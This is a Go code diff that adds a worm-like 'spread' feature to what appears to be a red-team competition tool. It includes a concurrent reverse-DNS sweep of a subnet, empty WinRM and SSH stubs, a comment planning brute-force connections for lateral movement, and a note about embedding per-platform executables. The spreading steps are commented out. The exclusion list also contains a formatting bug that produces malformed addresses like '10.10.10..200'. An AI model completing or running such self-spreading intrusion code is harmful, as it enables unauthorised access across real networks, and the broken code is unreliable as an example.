@@ -4,6 +4,8 @@ import (
 	"fmt"
 	"runtime"
 	"unicode"
+	"net"
+	"sync"
 )
 
 type Platform struct {
@@ -20,6 +22,95 @@ func is_only_letters(s string) bool {
 	return true
 }
 
+func reverse_lookup_hosts(subnet string) []string {
+    var (
+        found []string
+        mu    sync.Mutex
+        wg    sync.WaitGroup
+    )
+ 
+    sem := make(chan struct{}, 20) // 20 concurrent lookups
+
+    for i := 1; i < 255; i++ {
+        wg.Add(1)
+        go func(i int) {
+            defer wg.Done()
+            sem <- struct{}{}
+            defer func() { <-sem }()
+
+            ip := fmt.Sprintf("%s.%d", subnet, i)
+            _, err := net.LookupAddr(ip)
+
+            if err != nil { 
+				return 
+			}
+
+			mu.Lock()
+			found = append(found, ip)
+			mu.Unlock()
+        }(i)
+    }
+
+    wg.Wait()
+    return found
+}
+
+
+func winRM_to_host(host_ip string){
+
+}
+
+func SSH_to_host(host_ip string){
+
+}
+
+/*
+Look for next host to move to
+
+1. Look at DNS records
+
+2. Brute force connection by trying WinRM or SSH
+*/
+func spread() {
+	exclusion_list := []string{
+		// Our team systems
+		"10.10.100.101",
+		"10.10.100.102",
+		"10.10.100.103",
+		"10.10.100.104",
+		"10.10.100.105",
+		"10.10.100.106",
+		"10.10.100.107",
+		"10.10.100.108",
+	}
+
+	// Grey team systems
+	for i := 200; i < 255; i++ {
+		exclusion_list = append(exclusion_list, fmt.Sprintf("%s.%d", "10.10.10.", i))
+	} 
+
+	fmt.Println(exclusion_list)
+	// exclusion_map := make(map[string]bool)
+	// for _, ip := range exclusion_list {
+	// 	exclusion_map[ip] = true
+	// }
+
+	// target_hosts := reverse_lookup_hosts("10.10.10")
+
+	// for _, host_ip := range target_hosts {
+	// 	if 
+	// } 
+
+	// for _, host_ip := range target_hosts {
+
+	// 	winRM_to_host(host_ip)
+	// 	SSH_to_host(host_ip)
+
+	// } 
+
+}
+
+
 func main(){
 	
 	host_os := runtime.GOOS
@@ -31,7 +122,7 @@ func main(){
 	} 
 
 	/*
-	COME BACK HERE WHEN WAGON IS DONE TO EMBED EXEs INTO DICT
+	!!! COME BACK HERE WHEN WAGON IS DONE TO EMBED EXEs INTO DICT !!! 
 	*/
 	binaries := map[Platform]string {
 		{OS: "windows", Arch:"64"} : "WINDOWS - x64",
@@ -43,5 +134,7 @@ func main(){
 	}
 
 	fmt.Println(binaries[Platform{OS: host_os, Arch: arch}])
+	
+	spread()
 
 }
